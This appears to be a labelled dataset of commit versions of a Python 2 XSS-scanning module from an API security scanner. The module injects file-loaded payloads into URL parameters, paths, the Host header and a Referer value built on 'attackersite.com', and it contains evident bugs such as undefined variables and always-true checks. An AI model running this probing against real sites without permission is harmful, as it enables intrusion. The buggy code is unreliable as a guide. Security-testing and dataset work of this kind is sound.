,id,code,label
0,351a3ccd8dd6944ebeb0faf902c9de5f21be43b6,"modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if 'application/json' or 'text/plain' in xss_request['Content-Type']:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact

def xss_get_method(url,method,headers,body,scanid=None):
    # Test for XSS in GET param
    result = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        xss_url = url.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        if xss_request.text.find(payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                            dbupdate.insert_record(attack_result)
                            result = True

                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
                    for uri_list in uri_check_list:
                        if uri_list in url:
                            # Parse domain name from URI.
                            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
                            break
                    if parsed_url == '':
                        parsed_url = url

                    xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
                    if xss_request_url.text.find(payload) != -1:
                        impact = check_xss_impact()
                        xss_result = True

                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
                    if xss_request_url.text.find(payload) != -1:
                        impact = check_xss_impact()
                        xss_result = True

                    if xss_result is True:
                        print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                        attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                        dbupdate.insert_record(attack_result)
               
            except:
                logs.logging.info(""XSS: No GET param found!"")

def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_method(url,method,headers,body,scanid)
        #xss_http_headers(url,method,headers,body,scanid)/n/n/n",0
1,351a3ccd8dd6944ebeb0faf902c9de5f21be43b6,"/modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if 'application/json' or 'text/plain'in xss_request['Content-Type']:
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact

def xss_get_method(url,method,headers,body,scanid=None):
    # Test for XSS in GET param
    result = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        xss_url = url.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        if xss_request.text.find(payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                            dbupdate.insert_record(attack_result)
                            result = True

                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
                    for uri_list in uri_check_list:
                        if uri_list in url:
                            # Parse domain name from URI.
                            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
                            break
                    if parsed_url == '':
                        parsed_url = url

                    xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
                    logs.logging.info(""%s is vulnerable to XSS"",url)
                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:
                        impact = check_xss_impact(xss_request_url.headers)
                        print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                        attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                        dbupdate.insert_record(attack_result)
           
            except:
                logs.logging.info(""XSS: No GET param found!"")

def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    xss_payloads = fetch_xss_payload()
    xss_get_method(url,method,headers,body,scanid)
    xss_http_headers(url,method,headers,body,scanid)/n/n/n",1
2,c7435cdd6357bed9fa1859782a70ad6a7a71125d,"modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if 'application/json' or 'text/plain' in xss_request['Content-Type']:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact

def xss_get_method(url,method,headers,body,scanid=None):
    # Test for XSS in GET param
    result = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        xss_url = url.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        if xss_request.text.find(payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                            dbupdate.insert_record(attack_result)
                            result = True

                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
                    for uri_list in uri_check_list:
                        if uri_list in url:
                            # Parse domain name from URI.
                            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
                            break
                    if parsed_url == '':
                        parsed_url = url

                    xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
                    if xss_request_url.text.find(payload) != -1:
                        impact = check_xss_impact()
                        xss_result = True

                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
                    if xss_request_url.text.find(payload) != -1:
                        impact = check_xss_impact()
                        xss_result = True

                    if xss_result is True:
                        print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                        attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                        dbupdate.insert_record(attack_result)
               
            except:
                logs.logging.info(""XSS: No GET param found!"")

def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_method(url,method,headers,body,scanid)
        #xss_http_headers(url,method,headers,body,scanid)/n/n/n",0
3,c7435cdd6357bed9fa1859782a70ad6a7a71125d,"/modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if 'application/json' or 'text/plain'in xss_request['Content-Type']:
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact

def xss_get_method(url,method,headers,body,scanid=None):
    # Test for XSS in GET param
    result = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        xss_url = url.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        if xss_request.text.find(payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                            dbupdate.insert_record(attack_result)
                            result = True

                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
                    for uri_list in uri_check_list:
                        if uri_list in url:
                            # Parse domain name from URI.
                            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
                            break
                    if parsed_url == '':
                        parsed_url = url

                    xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
                    logs.logging.info(""%s is vulnerable to XSS"",url)
                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:
                        impact = check_xss_impact(xss_request_url.headers)
                        print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                        attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                        dbupdate.insert_record(attack_result)
           
            except:
                logs.logging.info(""XSS: No GET param found!"")

def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    xss_payloads = fetch_xss_payload()
    xss_get_method(url,method,headers,body,scanid)
    xss_http_headers(url,method,headers,body,scanid)/n/n/n",1
4,0ba0637b662761acf042636097913f8fb84df4c7,"modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if 'application/json' or 'text/plain' in res_headers['Content-Type']:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {""Host"" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, ""GET"", headers)
        if host_header_xss.text.find(payload) != -1:
            impact = ""Low""
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": host_header_xss.headers ,""res_body"": xss_request.text}
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            dbupdate.insert_record(xss_http_headers)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload
        referer_header = {""Referer"" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, ""GET"", temp_headers)
        if ref_header_xss.text.find(payload) != -1:
            impact = check_xss_impact(temp_headers)
            print ""%s[{0}] {1} is vulnerable to XSS via referer header%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting via referer header"", ""impact"": impact, ""req_headers"": temp_headers, ""req_body"":body, ""res_headers"": ref_header_xss.headers ,""res_body"": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            break


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
            xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
            if result is not True:
                if xss_request_url.text.find(payload) != -1:
                    impact = check_xss_impact(xss_request_url.headers)
                    attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                    dbupdate.insert_record(attack_result)
                    result = True

            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
            if xss_request_url.text.find(payload) != -1:
                impact = check_xss_impact()
                print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        if xss_request.text.find(payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        if vul_param:
            # Update all vulnerable params to db.
            dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : vul_param+"" are vulnerable to XSS""}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)
    
    xss_http_headers(url,method,headers,body,scanid)/n/n/n",0
5,0ba0637b662761acf042636097913f8fb84df4c7,"/modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if 'application/json' or 'text/plain' in xss_request['Content-Type']:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    xss_result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
            xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
            if xss_request_url.text.find(payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                xss_result = True

            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
            if xss_request_url.text.find(payload) != -1:
                impact = check_xss_impact()
                xss_result = True

            if xss_result is True:
                print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                dbupdate.insert_record(attack_result)
                return

def xss_get_uri(url,method,headers,body,scanid=None):
    # Test for XSS in GET param
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        print ""param to test"",key
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        print xss_request.text
                        if xss_request.text.find(payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        print ""all params"",vul_param


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)
        #xss_http_headers(url,method,headers,body,scanid)/n/n/n",1
6,1611d2eb1cf40451f5c99ba6dc146d3ab11a54a1,"modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if 'application/json' or 'text/plain' in res_headers['Content-Type']:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {""Host"" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, ""GET"", headers)
        if host_header_xss.text.find(payload) != -1:
            impact = ""Low""
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": host_header_xss.headers ,""res_body"": xss_request.text}
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            dbupdate.insert_record(xss_http_headers)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload
        referer_header = {""Referer"" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, ""GET"", temp_headers)
        if ref_header_xss.text.find(payload) != -1:
            impact = check_xss_impact(temp_headers)
            print ""%s[{0}] {1} is vulnerable to XSS via referer header%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting via referer header"", ""impact"": impact, ""req_headers"": temp_headers, ""req_body"":body, ""res_headers"": ref_header_xss.headers ,""res_body"": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            break


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
            xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
            if result is not True:
                if xss_request_url.text.find(payload) != -1:
                    impact = check_xss_impact(xss_request_url.headers)
                    attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                    dbupdate.insert_record(attack_result)
                    result = True

            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
            if xss_request_url.text.find(payload) != -1:
                impact = check_xss_impact()
                print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        if xss_request.text.find(payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        if vul_param:
            # Update all vulnerable params to db.
            dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : vul_param+"" are vulnerable to XSS""}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)
    
    xss_http_headers(url,method,headers,body,scanid)/n/n/n",0
7,1611d2eb1cf40451f5c99ba6dc146d3ab11a54a1,"/modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if 'application/json' or 'text/plain' in xss_request['Content-Type']:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    xss_result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
